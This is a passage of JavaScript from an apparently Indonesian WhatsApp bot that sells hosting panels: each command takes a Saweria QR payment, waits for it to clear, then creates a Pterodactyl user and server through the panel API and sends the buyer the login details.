if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel.satu_gb.price, "BUY " + panel.satu_gb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'b1gb-v2':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel_v2.satu_gbb.price, "BUY " + panel_v2.satu_gbb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain2}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain2}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'b2gb':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel.dua_gb.price, "BUY " + panel.dua_gb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2024"
let cpu = "40"
let disk = "2024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'b2gb-v2':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel_v2.dua_gbb.price, "BUY " + panel_v2.dua_gbb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2024"
let cpu = "40"
let disk = "2024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain2}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain2}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'b3gb':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel.tiga_gb.price, "BUY " + panel.tiga_gb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3024"
let cpu = "50"
let disk = "3024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'b3gb-v2':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel_v2.tiga_gbb.price, "BUY " + panel_v2.tiga_gbb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3024"
let cpu = "50"
let disk = "3024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain2}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain2}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'b4gb':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel.empat_gb.price, "BUY " + panel.empat_gb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4024"
let cpu = "60"
let disk = "4024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
